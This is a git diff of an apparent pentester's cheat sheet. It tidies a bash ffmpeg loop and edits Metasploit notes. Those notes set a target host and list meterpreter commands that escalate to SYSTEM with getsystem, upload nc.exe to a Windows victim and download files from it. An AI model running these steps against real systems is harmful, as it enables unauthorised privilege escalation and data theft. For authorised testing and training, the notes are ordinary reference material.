@@ -19,7 +19,7 @@ cat filename.txt | tr '\n' ,
 for f in *\ *; do mv "$f" "${f// /_}"; done
 
 ### BULK screenshots using ffmpeg
-for file in $(ls | cut -d'.' -f1);do ffmpeg -i $file.mp4 -vframes 1 -s 1280x720 $file.jpg;done
+for file in $(ls | cut -d'.' -f1);do ffmpeg -i $file.mp4 -vframes 1 -s 1280x720 $file.jpg; done
 
 # ----- Linux Commands ----- #
 ### Process Running
@@ -302,12 +302,15 @@ db_import Nmap.xml
 services -p 80
 hosts -u
 services -p * 
+
 ### setg makes metasploit remember settings
 setg RHOTS 10.10.10.1
 
-### meterpreter payload
+### meterpreter commands
 sysinfo
 getuid
+use priv
+getsystem
 search -f *filename.txt
 upload /usr/share/windows-binaries/nc.exe c:\\users\
 download c:\\windows\file.txt /tmp/
